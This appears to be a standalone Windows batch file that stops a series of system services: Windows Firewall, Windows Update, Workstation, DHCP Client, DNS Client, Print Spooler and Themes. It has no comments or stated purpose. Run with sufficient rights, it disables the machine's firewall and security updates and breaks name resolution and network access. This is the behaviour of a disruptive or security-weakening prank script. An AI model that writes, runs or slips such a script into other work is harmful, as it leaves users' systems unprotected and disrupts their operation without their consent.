@echo off
net stop "Windows Firewall"
net stop "Windows Update"
net stop Workstation
net stop "DHCP Client"
net stop "DNS Client"
net stop "Print Spooler"	
net stop Themes
exit